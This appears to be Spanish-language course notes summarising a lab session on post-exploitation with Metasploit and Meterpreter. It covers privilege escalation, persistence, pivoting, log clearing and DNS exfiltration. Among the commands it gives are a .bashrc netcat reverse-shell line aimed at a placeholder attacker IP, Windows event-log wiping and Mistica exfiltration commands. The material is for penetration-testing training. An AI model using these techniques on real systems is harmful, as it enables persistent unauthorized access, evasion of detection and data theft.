Documentos de Referencia: "AS-II - Post Explotación .pdf"

# Informe Técnico: Post-explotación en Ciberseguridad

### 1. Resumen Ejecutivo
Este informe técnico se centra en el concepto de la post-explotación, una fase crítica en el ciclo de un ataque informático o una auditoría de seguridad. Se describen las acciones principales que se llevan a cabo en esta etapa, como la escalada de privilegios, el *pivoting*, el encubrimiento, la persistencia y la exfiltración de datos. El informe detalla las metodologías y herramientas, en particular Metasploit y Meterpreter, utilizadas para ejecutar estas acciones en sistemas Windows y Linux, y explica cómo se aplican en escenarios prácticos de laboratorio.

### 2. Conceptos Fundamentales
La post-explotación es la fase de un ataque que se inicia inmediatamente después de que un atacante ha obtenido acceso a un sistema comprometido. En esta etapa, el objetivo es maximizar el control sobre el sistema para lograr los objetivos del ataque. Los conceptos clave de esta fase son:

* **Escalada de Privilegios (*Elevation of Privileges*)**: Consiste en elevar los privilegios de un usuario para obtener un rol de superusuario o administrador. Al acceder a un sistema por primera vez, el atacante a menudo tiene un rol limitado, por lo que esta es una de las acciones más importantes en la post-explotación.
* ***Pivoting***: Es una técnica que permite a un atacante utilizar un sistema comprometido como un "puente" para escanear y atacar nuevas redes o *hosts* que no eran accesibles desde el perímetro de la red.
* **Encubrimiento (*Covering*)**: El objetivo es eliminar cualquier rastro que la intrusión haya generado. Esta acción es fundamental en ejercicios de *Red Team* para evitar ser detectado por los sistemas de defensa de la empresa, conocidos como *Blue Team*.
* **Persistencia (*Persistence*)**: Se refiere a las técnicas utilizadas para mantener el acceso remoto a una máquina, incluso si el usuario legítimo corrige la vulnerabilidad, cierra el puerto de entrada o reinicia el sistema.
* **Exfiltración (*Exfiltration*)**: Implica robar y sacar información sensible de la red comprometida. Las técnicas de exfiltración buscan canalizar los datos encapsulándolos en tráfico legítimo, como DNS, ICMP, o HTTPs, para evadir los sistemas de detección.

### 3. Procedimientos Prácticos
Los procedimientos prácticos se llevan a cabo en un entorno de laboratorio que incluye las siguientes máquinas virtuales y herramientas:
* **Máquina Atacante:** Kali Linux.
* **Máquinas Víctimas:** Windows XP / Windows 7 y Metasploitable 2 (una distribución de Linux vulnerable).
* **Entorno de Virtualización:** VirtualBox y VMware.

Los procedimientos prácticos se dividen en las siguientes categorías, tal como se abordaron en las sesiones:

#### Técnicas de Persistencia en Sistemas Linux
El objetivo es mantener el acceso a una máquina Linux después de una intrusión inicial. Se asume que el atacante ya tiene acceso remoto y, preferiblemente, ha escalado privilegios.

* **Uso del módulo `apt_package_manager_persistence`:**
    * Se utiliza el comando `search apt` para encontrar el módulo de persistencia para el gestor de paquetes de APT.
    * Se selecciona el módulo con `use [índice]` y se configura la sesión con `set SESSION [ID_de_sesión]`. El módulo crea un *hook* en un archivo de configuración de APT (`apt.conf.d`) que ejecuta un *payload* cada vez que se usa el gestor de paquetes.
    * Se ejecuta el módulo con `run`, lo que inyecta la persistencia en el sistema víctima.
    * Se debe levantar un *handler* de forma manual con `use exploit/multi/handler` y `run` para que Metasploit se ponga a la escucha de la nueva conexión que se generará en cuanto la víctima use el comando `apt-get`.

* **Uso manual de `bash_profile_persistence`:**
    * Este método implica modificar manualmente un archivo de configuración de la *shell* de Bash (`.bashrc`) para que ejecute un comando de persistencia.
    * Desde la sesión de Meterpreter, se navega al directorio del usuario víctima y se añade una línea al archivo `.bashrc` con un comando, como `nc -e /bin/sh [IP_atacante] [puerto]`, usando `echo` para redirigir la salida al archivo.
    * Se configura una máquina a la escucha con el comando `nc -lvp [puerto]`. Cuando la víctima inicie una nueva *shell* de Bash, el comando se ejecutará, estableciendo una nueva sesión remota para el atacante.

#### Técnicas de Persistencia en Sistemas Windows
Se demuestran métodos para mantener el acceso a sistemas Windows, aprovechando las funcionalidades del sistema operativo.

* **Migración de Procesos (`migrate`)**:
    * Una vez obtenida una sesión de Meterpreter, se utiliza el comando `migrate` para mover la sesión a un proceso del sistema más estable, como `lsass.exe`, que siempre está en ejecución.
    * Esto asegura que la sesión no muera si la aplicación vulnerable inicial se cierra o es parcheada por el usuario.

* **Creación de Usuarios Remotos**:
    * Se utiliza el comando de *shell* `net user` para crear un nuevo usuario y `net localgroup Administrators` para añadirlo al grupo de administradores.
    * Con el usuario creado, se puede habilitar el servicio de RDP (Remote Desktop Protocol) en el sistema víctima utilizando el módulo de Metasploit `post/windows/manage/enable_rdp`.
    * Esto permite el acceso remoto al escritorio de la máquina víctima utilizando herramientas como `xfreerdp`.

* **Persistencia mediante registro de Windows**:
    * El módulo `exploit/windows/local/persistence` instala un *payload* que se ejecuta en el arranque del sistema, ya sea al inicio de sesión de un usuario o del sistema.
    * Este módulo crea una entrada en el registro de Windows en `CurrentVersion\Run`, lo que garantiza que la sesión se reactive cada vez que se reinicie la máquina y el usuario se autentique.

#### Técnicas de Encubrimiento en Sistemas Windows
Para eliminar el rastro de una intrusión en Windows, se usan los siguientes comandos de Meterpreter:
* **`clearev`**: Elimina registros y eventos del sistema a nivel de aplicación y sistema.
* **`run event_manager`**: Un *script* de Meterpreter que permite gestionar y borrar los registros de eventos de Windows.

#### Técnicas de *Pivoting*
El *pivoting* se ejemplifica con un escenario de tres máquinas: Kali (atacante), Metasploitable2 (*pivote*) y Windows 7 (objetivo).

* **Autoruteo (`autoroute`)**:
    * Una vez obtenida la sesión inicial en el *pivote* (Metasploitable2), se utiliza el comando `run autoroute -s [rango_de_red]` para configurar un enrutamiento en Metasploit, permitiendo que Kali alcance la red interna donde se encuentra Windows 7.
    * Esto permite lanzar exploits directamente a las máquinas de la red interna, como si estuvieran en la misma red que Kali.

* ***Port Forwarding***:
    * Permite redirigir el tráfico de un puerto local en la máquina Kali a un puerto y dirección IP remota de la red interna.
    * El comando `portfwd add -l [puerto_local] -p [puerto_remoto] -r [IP_remota]` crea un túnel, permitiendo a Kali interactuar con servicios remotos (ej. SMB en el puerto 445 de Windows 7) como si fueran locales.

* ***SOCKS Proxy***:
    * Esta técnica es más flexible que el *port forwarding*. Se configura un servidor proxy en Metasploit, que escucha en un puerto local de Kali.
    * Se utiliza la herramienta `proxychains` de Kali para forzar a cualquier comando (como `ping`) a que enrute su tráfico a través de este proxy de Metasploit, que a su vez lo redirigirá por la sesión de Meterpreter hasta la red interna inaccesible.

#### Exfiltración de Datos (*Data Exfiltration*)
Se explica cómo robar datos de una red comprometida de forma sigilosa.
* **Encapsulación en protocolos legítimos**: La clave de la exfiltración exitosa es ocultar la información en protocolos de tráfico normal, como DNS, HTTPS o ICMP, para evitar la detección por sistemas de seguridad.
* **Uso de la herramienta Mistica**:
    * Esta herramienta opera con una arquitectura cliente-servidor. El servidor se ejecuta en la máquina del atacante (Kali) y el cliente en la máquina de la víctima.
    * El comando para el servidor es `ms.py -m io:dns -k "[clave]" -s`. El comando del cliente es `mc.py -m io:dns -k "[clave]" -w`.
    * El cliente toma los datos, los cifra, los divide en fragmentos, los codifica y los inserta en consultas DNS (ej. `[fragmento].dominio-del-atacante.com`). Estas consultas se envían al servidor del atacante, que reconstruye el archivo.

### 4. Conclusiones y Puntos Clave
* **Importancia y Beneficios de Seguridad**: La post-explotación es una fase crucial que define el éxito de un ataque o una auditoría. Permite a los profesionales de la seguridad simular las acciones de un atacante sofisticado (APT) para identificar vulnerabilidades internas, evaluar las defensas de una organización (*Blue Team*) y detectar fallos en la segmentación de red.

* **Puntos de Aprendizaje Clave**:
    * Las fases de un ataque informático son secuenciales, pero la post-explotación requiere un enfoque centrado en la máquina comprometida.
    * Metasploit y Meterpreter son herramientas poderosas que automatizan muchas de las tareas manuales de post-explotación, aunque también es vital comprender cómo realizar estas acciones manualmente.
    * La persistencia y el *pivoting* son fundamentales para mantener el control y expandir el acceso a la red de la víctima.
    * El encubrimiento es tan importante como el acceso, especialmente en simulacros de *Red Team*, para evitar la detección.
    * La exfiltración de datos se basa en la encapsulación de tráfico para evadir los sistemas de detección, siendo los protocolos como DNS y HTTP(S) los más comunes para este fin.

* **Relevancia Técnica**: Los procedimientos detallados, desde la migración de procesos hasta la configuración de un túnel SOCKS, son habilidades esenciales para los *pentesters* y los equipos de seguridad. El conocimiento de herramientas como `autoroute`, `portfwd`, `proxychains` y *scripts* de exfiltración permite a los profesionales realizar pruebas de penetración realistas y exhaustivas. Comprender la lógica detrás de cada acción, como por qué usar una *bind shell* en lugar de una *reverse shell* en ataques de *pivoting*, es lo que distingue a un auditor competente y eficaz.